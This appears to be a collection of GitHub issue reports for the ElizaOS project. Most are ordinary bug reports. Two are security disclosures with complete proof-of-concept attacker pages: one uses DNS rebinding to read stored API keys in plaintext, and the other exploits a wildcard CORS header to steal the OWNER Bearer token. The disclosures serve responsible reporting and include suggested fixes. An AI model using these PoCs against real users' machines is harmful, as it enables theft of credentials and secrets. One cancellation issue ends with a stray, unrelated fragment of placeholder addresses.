16:T4a7,## Follow-up

Nubs will look into this later. This is a deferred optimization investigation, not a confirmed correctness bug or an approved implementation change.

A combined Notes and Calendar read used four foreground model calls: response handler, planner, evaluator after Notes, and the same evaluator again after Calendar. The first evaluation decided whether to continue; the second checked completion and produced the answer.

Investigate whether demonstrably independent, read-only actions can complete before a single evaluation, without weakening conditional execution, permissions, failure handling, evidence checks, or final-answer validation. Do not simply remove the intermediate evaluation: dependent requests may need it to decide whether the next action should run.

Acceptance for any future proposal:
- Explicitly distinguish independent work from conditional or dependent work.
- Preserve cases where the second read must not execute.
- Compare actual trajectories, correctness, call counts, token usage, and latency.
- Retain the existing behavior unless a simpler safe alternative is supported by evidence.

No runtime behavior is changed as part of filing this issue.
17:T2a59,## Summary

Two locally-trusting servers started by the desktop app combine into a **DNS rebinding** bypass of the same-origin policy:

1. The **renderer server** (Electrobun main process, `Bun.serve`, `127.0.0.1:5174`) reverse-proxies `/api/*`, `/ws`, `/music-player` to the agent API it spawned on `127.0.0.1:31337`. Before forwarding, it **strips the request's `Host` header** (treated as hop-by-hop) and rewrites it to the loopback target, while passing `Origin` / `Sec-Fetch-*` through. The proxy itself does not validate where a request comes from.
2. The **agent API** treats every loopback peer as **OWNER, unconditionally** (`isTrustedLocalRequest`).

An attacker serves a page from a rebinding domain — e.g. `7f000001.<attacker-ip-hex>.rbndr.us`, which alternates A records between the attacker's IP and `127.0.0.1` (TTL 1s). Once the domain resolves to `127.0.0.1`, the attacker's page is **same-origin with the renderer server**, and its GETs flow through the proxy into the agent API: `Host` has been rewritten to loopback, a same-origin GET carries **no `Origin` header**, and `Sec-Fetch-Site` is `same-origin` — every loopback-trust condition is satisfied *legitimately*, so the request is authorized as **OWNER with zero credentials**.

Result: any website can read **all GET endpoints** of the agent API, including:

- `GET /api/secrets/inventory` — enumerates every stored secret (key / label / category / lastModified)
- `GET /api/secrets/inventory/:key` — returns the secret's **current value in plaintext** (verified: `{"ok":true,"value":"sk-…","source":"bare"}`) — e.g. LLM provider API keys
- `GET /api/secrets` — directory with isSet status + masked values (`maskValue`) for cross-checking
- `/api/agents`, `/api/plugins`, `/api/rooms`, … — all business data

## Environment

- `@elizaos/app` 2.0.3-beta.7 (commit `876317fb`), Windows 11, default local configuration
- Attacker needs any domain that can alternate A records (the free `rbndr.us` service works) and an HTTP server on the **same port as the victim's renderer** (default 5174)

## Root cause

**Renderer proxy strips/rewrites Host** — `packages/app/platforms/electrobun/src/renderer-api-proxy.ts:74-92`:

```ts
const HOP_BY_HOP_HEADERS = new Set([
  "connection",
  "keep-alive",
  "host",   // ← the request's Host is dropped, then rewritten to the loopback proxy target
  ...
]);
```

**Agent API: loopback peer = unconditional OWNER** — `packages/agent/src/api/server-helpers-auth.ts:348-364`:

```ts
if (isTrustedLocalRequest(req)) return true;   // loopback peer → OWNER, no credentials
```

`isTrustedLocalRequest` (`packages/core/src/security/loopback-trust.ts:374-416`) bases the decision entirely on request properties: loopback TCP peer, no proxy-client-IP headers, loopback `Host`, `Sec-Fetch-Site` ∈ {missing, same-origin, none}, `Origin` absent-or-trusted (`isTrustedLocalOrigin`, :347-360, passes when `Origin` is missing). This correctly blocks **direct** cross-site requests to `:31337` (`Sec-Fetch-Site: cross-site` → 403) — but after a rebind, the browser's request *is* same-origin, so it passes.

The secrets endpoints are gated on OWNER only — e.g. `packages/app/src/api/secrets-inventory-routes.ts:124` (`ensureRouteMinRole(..., "OWNER")`), `packages/agent/src/api/plugin-management-routes.ts:280-291` — and a rebound request **is** OWNER. (Additionally, `packages/agent/src/api/media-runtime.ts:92-115` marks media routes `public: true`.)

Attack chain:

```
attacker domain (A record → attacker) serves the malicious page
  → TTL expires, domain resolves to 127.0.0.1 (rbndr.us alternates both IPs, TTL 1s)
  → page is now same-origin with the renderer (127.0.0.1:5174)
  → same-origin GET fetch("/api/secrets/inventory/<key>")
  → renderer proxy strips Host, forwards → agent API (127.0.0.1:31337)
  → loopback peer + rewritten Host + GET without Origin → trusted → OWNER
  → 200 {"ok":true,"value":"sk-…"} — plaintext API key, readable same-origin
```

## Steps to reproduce

> DNS rebinding requires the attacker page to be served on the **same port** the victim's renderer listens on (default 5174, from any non-loopback IP — a second machine, or another NIC/LAN IP on the same machine).

1. **Attacker side:** save the PoC below as `poc.html` and serve it on port 5174 (`python -m http.server 5174`).
2. Build the rebinding domain: `7f000001.<attacker-ip-hex>.rbndr.us` — e.g. attacker `192.168.1.10` → hex `c0a8010a` → `7f000001.c0a8010a.rbndr.us` (`7f000001` = 127.0.0.1).
3. **Victim side:** start the desktop app (default config), browse to `http://7f000001.c0a8010a.rbndr.us:5174/poc.html`, click "Start".
4. The page polls a relative GET every 900 ms (≤90 tries). While DNS points at the attacker it just gets the PoC page back (or 404); once it flips to `127.0.0.1` you get `REBIND HIT`, and the page reads `/api/secrets/inventory`, `/api/secrets/inventory/<key>` (plaintext), `/api/agents`, `/api/plugins`, `/api/rooms` — all HTTP 200, bodies fully readable (same-origin).

Minimal PoC (any page on the rebinding domain, after the DNS flip):

```js
const keys = await (await fetch("/api/secrets/inventory", { cache: "no-store" })).json(); // enumerate stored secrets
const r = await fetch("/api/secrets/inventory/ANTHROPIC_API_KEY", { cache: "no-store" }); // same-origin GET, no Origin header
const data = await r.json(); // {"ok":true,"value":"sk-…","source":"bare"} — plaintext API key
```

Self-contained PoC page:

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>attacker rebind page</title></head>
<body style="background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;padding:24px">
<h2>ElizaOS Desktop — DNS rebinding unauthorized-read PoC (this page is the "attacker website")</h2>
<p>Target endpoint:
<select id="target">
  <option value="/api/secrets/inventory/ANTHROPIC_API_KEY">/api/secrets/inventory/:key (plaintext API key)</option>
  <option value="/api/secrets/inventory">/api/secrets/inventory (enumerate secrets)</option>
  <option value="/api/secrets">/api/secrets (directory: isSet + masked values)</option>
  <option value="/api/agents">/api/agents</option>
  <option value="/api/plugins">/api/plugins</option>
  <option value="/api/rooms">/api/rooms</option>
</select>
<button onclick="rebind()">Start DNS rebinding unauthorized read</button></p>
<pre id="log" style="background:#010409;border:1px solid #30363d;padding:12px;min-height:160px"></pre>
<script>
const log = (m, c) => {
  const d = document.createElement('div');
  d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;
  d.style.color = c || '#c9d1d9';
  document.getElementById('log').appendChild(d);
};
let scanning = false;
async function rebind() {
  if (scanning) return;
  if (location.protocol === 'file:') { log('[x] Open this page over http:// via the rbndr domain (file:// cannot rebind)', '#ff7b72'); return; }
  if (/^(127\.|localhost|\[::1\])/.test(location.hostname))
    log('[!] Warning: you are on a loopback hostname — a same-origin read is not evidence; use the rbndr domain', '#d29922');
  const target = document.getElementById('target').value;
  scanning = true;
  log('[*] Page origin: ' + location.origin + ' (the domain alternates attacker-IP <-> 127.0.0.1, TTL 1s)', '#8b949e');
  let hit = false;
  for (let i = 1; i <= 90 && !hit; i++) {
    try {
      const r = await fetch(target, { cache: 'no-store', referrerPolicy: 'no-referrer' });
      const body = await r.text();
      if (r.status === 200 && body.length > 0 && !/attacker rebind page/.test(body)) {
        // response is no longer this PoC itself (the attacker side serves this page) -> rebound to 127.0.0.1
        hit = true;
        log('[*] REBIND HIT @ try ' + i + ': ' + target + ' -> HTTP ' + r.status + ' (now same-origin with 127.0.0.1:' + location.port + ')', '#ff7b72');
        log('[+] First 500 bytes of the response:', '#3fb950');
        log('    ' + body.slice(0, 500), '#8b949e');
        if (target.indexOf('/api/secrets/inventory/') === 0 && /"value"\s*:/.test(body))
          log('[*] Plaintext API key read without authorization — ' + body, '#ff7b72');
        log('[*] Impact: a page on the attacker domain reads agent API GET data as OWNER, with no credentials', '#ff7b72');
      } else {
        log('[-] try ' + i + ': HTTP ' + r.status + ' (DNS currently on the attacker side / got the PoC page itself)', '#8b949e');
      }
    } catch (e) {
      log('[-] try ' + i + ': network error (DNS currently on the attacker side, or connection refused)', '#8b949e');
    }
    await new Promise(s => setTimeout(s, 900));
  }
  if (!hit) log('[x] No hit in 90 tries. Check: do the attacker server and the victim renderer use the same port (both 5174)? Is the rbndr domain correct?', '#ff7b72');
  scanning = false;
}
</script>
</body>
</html>
```

## Negative control (what already works)

- From an ordinary website: `fetch("http://127.0.0.1:5174/api/...")` → the browser attaches `Sec-Fetch-Site: cross-site` → the agent API returns **403**.
- Direct request to `:31337` with a stolen Bearer token → **403**.
- Only the rebinding path succeeds without credentials — the agent API does defend against direct cross-site access; the gap is the **renderer proxy chain**.

## Impact (and honest scope)

- Through this path a browser obtains **read-only OWNER access**: all GET endpoints, including stored secrets in plaintext.
- **Writes are blocked**: POST/PUT/DELETE from the browser carry `Origin` → 403. No write/RCE from the browser via this issue alone.
- Plaintext reads only cover secrets the victim has actually stored.
- Requires an attacker-controlled domain (free `rbndr.us` suffices) and the same port as the renderer (default 5174; if the renderer increments, the attacker port follows).
- The rebind usually lands within ~10 s of polling (90 × 900 ms window).
- Chrome LNA, if enforced, would block page→127.0.0.1 requests; default Chrome/Firefox today are affected.

## Suggested fix

1. **Validate `Host` in the renderer proxy** (`renderer-api-proxy.ts`): only forward requests whose `Host` is the expected loopback host (`127.0.0.1:5174` / `localhost:5174`); reject everything else. This is the standard DNS-rebinding mitigation — during a rebind attack the Host is the attacker's domain.
2. **Add a shared secret between the renderer proxy and the agent API**, so "can connect to :5174" no longer equals OWNER; loopback trust should not rest on forgeable/satisfiable headers alone.
3. **Never return secret plaintext from `/api/secrets/inventory/:key`** — return masked values or decrypt on explicit request, so even a bypassed OWNER read yields no key material.
4. Defense in depth: reject non-loopback `Host`/`Origin` outright in the loopback-trust check.18:T19a3,## Summary

The ElizaOS desktop app starts a local **renderer HTTP server** (Electrobun main process, `Bun.serve`, default `127.0.0.1:5174`, incrementing if taken). Two flaws on this server combine:

1. **Every static response is served with `Access-Control-Allow-Origin: *`** — JavaScript on any website can read the response bodies cross-origin.
2. **The built-in index page embeds the app's boot config in plaintext**, including the agent API's **OWNER-level Bearer token (`apiToken`)** and its base URL (`apiBase`).

So if the victim simply opens any attacker-controlled web page while the desktop app is running, that page performs one plain cross-origin GET (a simple request, **no preflight**) to `http://127.0.0.1:5174/`, reads the full HTML, and extracts the OWNER token with a regex. Zero interaction, no dialogs, completely silent — the app's highest-privilege credential is handed to an arbitrary website.

## Environment

- `@elizaos/app` 2.0.3-beta.7 (commit `876317fb`), Windows 11, default local configuration (no special settings)

## Root cause

`packages/app/platforms/electrobun/src/index.ts` — static-file handling of the renderer server:

```ts
// index.ts:915-933 — HTML branch
if (mimeExt === ".html" || filePath.endsWith("index.html")) {
    const html = apiBaseOwner.injectIntoHtml(content.toString("utf8"));  // :925 — injects apiToken + apiBase into the page
    return new Response(html, {
        headers: {
            "Content-Type": "text/html; charset=utf-8",
            "Access-Control-Allow-Origin": "*",                           // :929 — any origin may read this
            "Cache-Control": "public, max-age=0, must-revalidate",
        },
    });
}
```

```ts
// index.ts:934-937 — all other static assets
const headers: Record<string, string> = {
    "Content-Type": getRendererAssetContentType(mimeExt),
    "Access-Control-Allow-Origin": "*",                                   // :936
    ...
};
```

Either flaw alone would be harmless (no token embedded → nothing to steal; no `ACAO: *` → body unreadable cross-origin). Together, the OWNER credential leaves the victim's machine into the attacker's page context.

## Steps to reproduce

1. Start the desktop app (default config). The renderer listens on `127.0.0.1:5174`.
2. Open any other web page (any http/https origin — even `file://` works, which is convenient for verification) and run this from the browser console:

```js
const r = await fetch("http://127.0.0.1:5174/", { cache: "no-store" });
const html = await r.text();
console.log(r.headers.get("access-control-allow-origin")); // "*"  (cross-origin read allowed)
console.log(html.match(/apiToken:"([0-9a-fA-F]+)"/)[1]);   // the OWNER-level Bearer token
console.log(html.match(/apiBase:"([^"]+)"/)[1]);           // e.g. http://127.0.0.1:31337
```

3. The console prints the OWNER token.

Self-contained attacker page (save as `.html`, open in a browser on the victim machine, click the button):

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>attacker page</title></head>
<body style="background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;padding:24px">
<h2>ElizaOS Desktop — cross-origin OWNER token theft PoC (this page is the "attacker website")</h2>
<p>Renderer port (default 5174): <input id="port" value="5174" style="width:80px">
<button onclick="steal()">Steal OWNER token (cross-origin)</button></p>
<pre id="log" style="background:#010409;border:1px solid #30363d;padding:12px;min-height:120px"></pre>
<script>
const log = (m, c) => {
  const d = document.createElement('div');
  d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;
  d.style.color = c || '#c9d1d9';
  document.getElementById('log').appendChild(d);
};
async function steal() {
  const port = document.getElementById('port').value.trim() || '5174';
  log('[*] Target: http://127.0.0.1:' + port + '/  (plain GET, no preflight, any origin may send it)', '#8b949e');
  try {
    const r = await fetch('http://127.0.0.1:' + port + '/', { cache: 'no-store' });
    log('[+] HTTP ' + r.status, '#3fb950');
    const acao = r.headers.get('access-control-allow-origin');
    log(acao === null ? '[-] No ACAO header (this port may not be the renderer)'
                      : '[+] Access-Control-Allow-Origin: ' + acao, acao === '*' ? '#ffa657' : '#d29922');
    const html = await r.text();
    log('[+] Cross-origin body read succeeded, ' + html.length + ' bytes', '#3fb950');
    const tk = html.match(/apiToken:"([0-9a-fA-F]+)"/);
    const ab = html.match(/apiBase:"([^"]+)"/);
    if (tk) log('[+] Stolen OWNER Bearer token: ' + tk[1], '#ffa657');
    if (ab) log('[+] apiBase: ' + ab[1], '#ffa657');
    if (tk && ab) log('[*] Impact: a malicious website has obtained the agent API OWNER credential with zero interaction', '#ff7b72');
  } catch (e) {
    log('[-] Request failed: ' + e.message, '#ff7b72');
  }
}
</script>
</body>
</html>
```

## Expected / actual

- **Expected:** an external origin cannot read the local renderer's responses, and the OWNER token is never exposed to web content.
- **Actual:** `ACAO: *` lets any origin read the index HTML, which contains the OWNER Bearer token in plaintext.

## Impact (and honest scope)

- The agent API's **OWNER credential itself is exfiltrated** to any website the user visits — zero interaction beyond opening a page.
- Directly replaying **write** requests (POST/PUT) from the browser with the stolen token is rejected with 403: the agent API's loopback-trust check refuses requests carrying an untrusted `Origin` header (`packages/core/src/security/loopback-trust.ts:347-416`). The damage here is the credential leaving the machine, plus chaining with any local process or other issues — a local process holding this token can call the full API as OWNER.
- Chrome's Local Network Access (LNA), if enforced, would block page→127.0.0.1 requests; default Chrome/Firefox today are affected.
- Not applicable in external/cloud connection mode (no `apiToken` embedded there).

## Suggested fix

1. **Remove `Access-Control-Allow-Origin: *`** from static responses (`index.ts:929`, `index.ts:936`). The desktop UI does not need to be readable by arbitrary web origins.
2. **Don't embed the long-lived OWNER token in the HTML** (`injectIntoHtml`): deliver it via one-time runtime IPC, or use short-lived per-session credentials bound to the app's own processes.
3. If the UI must be served over HTTP, put an **Origin allowlist** on the renderer server (app protocol / loopback same-origin only).19:T6ee,### What happens

`buildSelfControlBlockPolicy` in `plugins/plugin-blocker/src/services/website-blocker/engine.ts` only adds a `www.` entry when the requested host has exactly two labels (`shouldAddWwwVariant`, line 1010). It also looks up the per-site policy group by the literal requested host (line 260). As a result the block silently leaves the site reachable in three common cases:

1. **Country-code registrable domains.** Blocking `bbc.co.uk`, `amazon.co.uk` or `abc.net.au` adds no `www.` entry, but these sites serve from `www.`.
2. **Requests that name the www host.** Blocking `www.example.com` (or a pasted `https://www.example.com/`) never blocks `example.com`.
3. **www requests for a site with a policy group.** Blocking `www.twitter.com` blocks only that host. The Twitter/X group that a `twitter.com` request gets (x.com, t.co, twimg hosts and others) is skipped, and twitter.com redirects to x.com, so the block has no practical effect.

In each case the block reports itself as active while the site stays open.

### Repro

```ts
import { buildSelfControlBlockPolicy } from "./engine";

buildSelfControlBlockPolicy(["example.co.uk"]).blockedWebsites;
// ["example.co.uk"]     (no www.example.co.uk)

buildSelfControlBlockPolicy(["www.example.com"]).blockedWebsites;
// ["www.example.com"]   (no example.com)

buildSelfControlBlockPolicy(["www.twitter.com"]).blockedWebsites;
// ["www.twitter.com"]   (a "twitter.com" request yields 13 hosts, including x.com and t.co)
```

### Expected

A registrable domain and its `www.` host should be treated as one site. Both should be blocked whichever one was named, and the site's policy group should apply. Other subdomains such as `news.example.co.uk` or `sub.example.org` should keep blocking only themselves.
1a:T8f0,## Problem

`AgentRuntime.useModel` checks both a caller-supplied `params.signal` and the owning streaming context's `abortSignal` before and after dispatch, but forwards only the explicit signal to the provider when both exist. Cancelling the turn while a cooperative provider is waiting on a response body therefore leaves the transport running. Runtime cancellation is only noticed after that handler eventually settles.

Reproduced against `develop` at `4039228dfdd965354cb61a9da0e26774de21ae02`, through the real runtime and a real local HTTP response body. This is transport/lifecycle evidence with a deterministic registered model handler, not a live LLM call.

## Reproduction

1. Register a `TEXT_LARGE` handler that calls `fetch(url, { signal: params.signal })` and awaits `response.text()`.
2. Have the local HTTP server flush a partial body and hold the response open.
3. Call `runtime.useModel` with an explicit caller controller inside `runWithStreamingContext({ abortSignal: turnController.signal }, ...)`.
4. After the server receives the request, abort only `turnController`.

The handler's signal remains un-aborted and the pending response is not cancelled. Aborting the explicit caller controller subsequently allows cleanup. Caller-only, turn-only, shared-signal, and pre-aborted controls behave correctly.

## Expected behavior

The provider transport should observe cancellation from either owner, without mutating the caller's request or aborting the other owner's controller. Cancellation must retain its reason and must not trigger provider fallback.

## Proposed scope

Compose the two distinct signals once at the dispatch boundary and use the same signal for provider parameters, runtime checks, downstream delivery, and embedding validation. Preserve signal identity when there is only one signal or both references are the same. Add real-runtime HTTP regressions and document the cancellation contract; no provider plugin API or dependency changes.

The new cancellation suite on the unchanged baseline is **1 failed / 6 passed**; after the implementation it is **7 passed**. The existing provider fallback suite also passes (**18 tests combined**). Full package and repository verification are being recorded separately, including any Windows limitations.

```json
    "0x1111111111111111111111111111111111111111",

    "0x1111111111111111111111111111111111111111",
    "0x2222222222222222222222222222222222222222"
  ]
```

1d:T4b9,## Problem

The standalone agent's `CONTACT` action schedules follow-ups as the requested instant, but its success message formats `scheduledAt` with bare `Date#toLocaleString()`. The confirmation therefore uses the host process timezone rather than the owner/calendar timezone.

This is owner-visible and host-dependent. For `scheduledAt=2026-08-20T23:00:00.000Z` with `TIMEZONE=America/Los_Angeles`:

- `TZ=UTC` reports `Scheduled follow-up with contact for 8/20/2026, 11:00:00 PM.`
- `TZ=America/New_York` reports `Scheduled follow-up with contact for 8/20/2026, 7:00:00 PM.`
- The owner-local time is `8/20/2026, 4:00:00 PM`.

The persisted `scheduledAt` remains the correct ISO instant; only the action result shown to the owner is wrong.

## Location

`packages/agent/src/actions/contact.ts`, `handleFollowup` success text.

## Acceptance criteria

- Resolve the canonical calendar timezone before scheduling the follow-up.
- Format the owner-visible confirmation in that explicit timezone.
- Keep the persisted/scheduled ISO instant unchanged.

1e:Tc2f,## Defect

`disconnectManagedGoogleConnection` (`packages/cloud/shared/src/lib/services/agent-google-connector/shared.ts:547-566`) falls through to `connections[0]` when an **explicit** `connectionId` matches nothing:

```ts
const activeConnection =
  (args.connectionId
    ? connections.find((connection) => connection.id === args.connectionId)
    : getPreferredActiveConnection(connections, args.userId, args.side)) ??
  connections[0] ??        // <- explicit-but-unknown id lands here
  null;
```

A caller who passes a stale, wrong, or cross-side UUID — with otherwise valid authentication — gets **HTTP 200 `{ok:true}`** while a *different* connection (the first in the scoped list) is revoked. The explicit-id contract ("disconnect THIS one") silently degrades into "disconnect whatever is first."

This is the `shared.ts:555-558` fallthrough flagged independently during #33090 review — outside that PR's body-validation scope, so filed separately as promised.

## Reproduction (logic path, current `develop`)

1. Authenticate as a user with ≥1 managed owner-side Google connection (id `A`).
2. `POST /api/v1/eliza/google/disconnect` with a well-formed but nonexistent UUID: `{"connectionId":"3f1c2a4e-0000-4000-8000-000000000000"}`.
3. The route parses fine (valid UUID), the connector's `find` returns `undefined`, and `?? connections[0]` selects connection `A`.
4. **Result: 200 `{ok:true}` and connection `A` is revoked.**

Same call shape, second connection `B` present and listed first: the caller intended to remove nothing that exists, and `B` is destroyed.

## Expected behavior

- An **explicit** `connectionId` that matches nothing in the caller's scoped connections → `AgentGoogleConnectorError` 404 (`Google connection not found.`), **no revoke** — exactly the contract the same file already implements for explicit-grant lookup in `getConnectionStatus` (`shared.ts:479`: `fail(404, "Google connection not found.")`).
- Omitted/null `connectionId` keeps today's disconnect-active-or-first behavior unchanged.
- The route already maps `AgentGoogleConnectorError` to its status (verified in `disconnect/route.ts` catch), so the 404 propagates with no route changes.

## Acceptance

- `{"connectionId": "<well-formed unknown uuid>"}` with scoped connections present → 404, zero `revokeConnection` calls.
- `{"connectionId": "<known uuid>"}` → 200, that connection revoked (unchanged).
- Empty body / `{}` / `{"connectionId": null}` → 200, active-or-first revoked (unchanged).
- No scoped connections + explicit id → 404 (not the silent no-op `return` the current code takes).

## Evidence

- Server-only API behavior; connector call ledger from the #33090 review thread documents the same silent-revoke class for malformed bodies (this issue is the explicit-id half).
- Reviewed head: `develop` `8113...` (2026-10-02), function verified unchanged by the 11 commits between `27dec7b0c3` and current develop.

<!-- eliza-computer-attribution:v1 {"provider":"nvidia","model":"z-ai/glm-5.3","client":"Hermes Agent","skill_revision":"local:slop-eliza/skills/slop-cash-contribute"} -->1f:T9a5,Requested by review on #33047 (hermesagent270-commits, Prabhat1308, nothingxnowhere): the install-boundary Bun pin guard needs a focused issue to own its acceptance criteria.

## Scope

The root-postinstall Bun pin guard must reflect the real install boundary: two Bun runtimes participate in an install and each can be off-pin independently.

1. **Installer runtime.** The binary that resolved dependencies and wrote `bun.lock` is exposed to lifecycle scripts as `npm_execpath`. Checking only the `bun` on PATH let an off-pin installer pass because a pinned child masked it (reproduced in the #33047 reviews with two real binaries, both directions). The guard must validate the installer identity from `npm_execpath` and fail closed when it cannot be established (missing, not executable, or not a Bun).
2. **Postinstall runtime.** The `bun` resolved from PATH runs the patch/build chain and must stay checked (its `Bun.build` output differs across versions).
3. **Honest claims.** The guard runs as the first postinstall link, so it fires after dependency resolution: an off-pin install has already extracted packages and may have rewritten `bun.lock`. Failure output must say so, name the restore step (`git checkout -- bun.lock`), and lead with a platform-neutral remediation (official installer, pinned version) instead of a Linux-only bootstrap.

## Acceptance criteria

- A lifecycle integration test launches one Bun executable while `PATH` resolves another and proves: an off-pin installer cannot pass via a pinned PATH bun, and a pinned installer is not rejected because an off-pin bun happens to be on PATH (the failure names the postinstall runtime, not the installer).
- The install wiring is tested: the guard is the first root-postinstall link.
- Non-Bun installers (npm/pnpm/yarn launchers) and a missing `npm_execpath` fail closed in install context.
- The decision rejects every non-pinned concrete release (including `1.4.10` vs pin `1.4.2` and prerelease/build-suffixed variants) and its rationale matches the actual comparison.

## Evidence plan

- Real two-binary transcript (off-pin 1.3.14 installer + pinned 1.4.2 PATH, and the reverse) from the lifecycle test, captured in the PR.
- Real npm-installer refusal transcript.
- `bun --config=packages/scripts/bunfig.script-tests.toml test --conditions=eliza-source packages/scripts/check-bun-runtime-pin.test.ts` green, Biome (pinned 2.5.14) clean.

Resolves the process blocker recorded on #33047.20:Taf1,## Problem

Reminder delivery renders the reminder's due time in the **host** timezone in two owner-visible places in `plugins/plugin-personal-assistant/src/lifeops/domains/reminders-service.ts`:

1. `buildReminderDispatchPrompt` (the model-facing dispatch prompt) formats `- due:` with `new Date(args.reminderAt).toLocaleString()` — no `timeZone`. The model writes owner copy anchored to the server's wall clock, so with a UTC host and an `America/Los_Angeles` owner a 4:00 PM PDT reminder is described to the model as "11:00 PM".
2. `renderReminderBody`'s deterministic fallback calls `buildReminderBody` **without** the `timezone` it already supports, so the fallback body ("Due: …") is host-local too. This fallback is what owners actually receive whenever `TEXT_SMALL` is unavailable, returns unusable text, or throws.

`dispatchReminderAttempt` already resolves and carries `timezone: string`, and the exact in-app one-time path passes it through (`buildReminderBody({ ...args, … })`), so the value is in scope at both call sites — it is simply dropped.

This is the same defect family as #33155 (cadence summaries), but a different file and path: delivered reminder copy and the reminder dispatch prompt. #33164's fix touches only `actions/life.ts`.

## Reproduction

Current `develop`: `3248f87109353350b3721127bfaebaf8f081a740`; `reminders-service.ts` blob `3fb32700f87af20197e257d9a74d1f2509124b3c`.

- host `TZ=UTC`: `Due: 8/20/2026, 11:00:00 PM` and `- due: 8/20/2026, 11:00:00 PM`
- host `TZ=America/New_York`: `Due: 8/20/2026, 7:00:00 PM` and `- due: 8/20/2026, 7:00:00 PM`

Expected in both environments: `4:00 PM` (the owner's wall clock).

## Acceptance criteria

- `buildReminderDispatchPrompt` renders `- due:` in the explicit definition/draft timezone when one is provided, and is invariant across host `TZ` values.
- `renderReminderBody` threads the owner timezone into both the fallback body and the prompt; `dispatchReminderAttempt` passes its `timezone` through.
- Omitted timezone keeps today's behavior (no format change for callers that do not supply one).
- Focused regressions cover the prompt formatter, the fallback body, and the `dispatchReminderAttempt → renderReminderBody` threading.

23:T54f,**Describe the bug**

`PERSONAL_ASSISTANT action=sign_document` queues a `sign_document` approval whose `documentId` (`signature-<messageId>`) names no DocumentRequest. When the owner approves it, RESOLVE_REQUEST looks the DocumentRequest up, doesn't find it, and returns `DOCUMENT_REQUEST_NOT_FOUND` ("the document store does not survive restarts … Please re-issue"), so this surface can never dispatch. When no URL is given, the handler also stores the literal `"pending-signature-url"` in the approval payload.

`OWNER_DOCUMENTS subaction=request_signature` creates the DocumentRequest first and works.

**Reproduction (develop `811c3fac48`)**

Seed through `personalAssistantAction.handler` with `{ action: "sign_document", documentName: "Partner NDA" }`, then run `executeApprovedRequest` on the queued payload: `success: false`, `error: DOCUMENT_REQUEST_NOT_FOUND`, no queue transitions. The live-only scenarios that seed with this surface (`document-signature-chase`, `nda-counterparty-redline-handoff`, `board-consent-signature-emergency`, …) assert an approved outcome that this path cannot produce.

**Expected**

An approval from the assistant surface dispatches the same way as one from OWNER_DOCUMENTS, and a missing URL is not replaced with an invented one.

Fix: #33144

AI provider/model: anthropic / claude-opus-5-5. Client: Claude Code.
24:Tf79,**Describe the bug**

`POST /api/my-agents/claim-affiliate-characters` marks a supplied anonymous
session converted and inactive before attempting any of the session-backed
character ownership transfers.

The route later ignores converted sessions (`!session.converted_at`). If
`charactersService.claimAffiliateCharacter` returns a failure or throws, the
response reports the failed claim but the session token has already been
consumed. A retry can no longer rediscover session-only characters, so a
temporary ownership-transfer failure becomes permanent.

This is distinct from #33070 / #33121, which validate the route's request body;
the defect here is the ordering of two successful domain operations after a
valid request.

**Executed reproduction**

I mounted the real Hono route from current `develop`
(`811c3fac48df3c3e4e8e7414ef78e544fa7dac08`) with deterministic repository and
service boundaries:

- valid authenticated user and organization;
- valid, unconverted anonymous session;
- one character owned by the anonymous session user and discoverable only by
  the session token;
- `claimAffiliateCharacter` returns
  `{ success: false, message: "temporary database failure" }`;
- a shared event ledger records conversion and claim calls.

```text
bun test packages/cloud/api/__tests__/claim-affiliate-session-conversion.test.ts

1 pass, 0 fail, 4 assertions
events: ["session-converted", "claim-failed"]
response: HTTP 200, claimed: [], failed: [character]
```

The passing reproduction asserts the current broken behavior. The conversion
service deactivates the session and sets `converted_at`; a later request skips
the session before it can retry the failed character.

**Expected behavior / acceptance**

- Session-backed ownership transfers run before the session is marked
  converted.
- A returned or thrown claim failure leaves the session unconverted and
  retryable.
- Multiple session-backed characters may partially succeed; the session stays
  retryable until every session-backed character in that attempt succeeds.
  Already-transferred characters are naturally absent from the anonymous
  owner's next `listByUser` result.
- Once all session-backed claims succeed, `markConverted` runs exactly once and
  only after the claim calls.
- Failures on unrelated room-discovered characters do not prevent conversion
  when every character associated with the supplied session succeeded.
- The existing page-safe response contract from #13769 remains intact.
- Regression tests exercise the real route and assert response payloads plus
  claim/conversion ordering and ledgers.

**Evidence / reproduction proof**

- Screenshots / recording: N/A — server-only API ordering with no rendered UI.
- Backend logs: N/A — the exact route response and ordered service ledger are
  recorded above.
- Frontend console/network logs: N/A — no frontend behavior changes.
- Real-LLM trajectory: N/A — no agent planner or model behavior is involved.
- Domain artifacts: no live rows were mutated; deterministic service ledgers
  prove the invalid ordering.

**Duplicate and overlap search**

Open and closed issues, open pull requests, route history, and in-repository
tests were searched for affiliate-claim conversion ordering and retryability.
No existing issue or PR covers this failure. The route's existing end-to-end
coverage proves successful ownership transfer but does not inject a claim
failure. #33070 / #33121 touches request decoding in the same route and should
land first so this ordering fix can rebase without mixing concerns.

25:Tc0b,**Describe the bug**

`POST /api/v1/eliza/google/disconnect` silently converts malformed JSON to an
empty object. The route then applies its defaults (`side: "owner"`,
`connectionId: null`) and calls `disconnectManagedGoogleConnection`, where a
null connection id means **disconnect every managed Google connection on that
side**.

A truncated or otherwise unreadable request body can therefore become a
successful bulk disconnect instead of a rejected request.

**To reproduce**

Against current `develop` (`27dec7b0c38eb6f38b397758b08be67680bf8d64`):

1. Authenticate as a user with one or more managed owner-side Google
   connections.
2. Send `POST /api/v1/eliza/google/disconnect` with
   `Content-Type: application/json` and the truncated body `{`.
3. Observe HTTP 200 `{ "ok": true }` and a bulk disconnect call.

A deterministic real-Hono-route harness used the production parser, zod
schema, routing, defaults, response, and mutation ordering, with auth and the
Google connector replaced by call-ledger boundaries:

```text
request body: {
HTTP status: 200
disconnectManagedGoogleConnection calls: 1
arguments:
  organizationId: org-1
  userId: user-1
  side: owner
  connectionId: null

focused reproduction: 1 passed, 0 failed, 2 assertions
```

The temporary reproduction file was removed afterward and the contribution
worktree is clean.

**Expected behavior**

- Malformed or unreadable non-empty JSON returns HTTP 400 before the connector
  service is called.
- Syntactically valid but schema-invalid JSON continues to return HTTP 400.
- If the existing API contract intentionally supports a bodyless request or a
  valid `{}` as “disconnect all owner-side connections,” that behavior remains
  explicit and unchanged; it must not be conflated with parse failure.

**Evidence / reproduction proof**

- Screenshots / recording: N/A — server-only API behavior with no rendered UI.
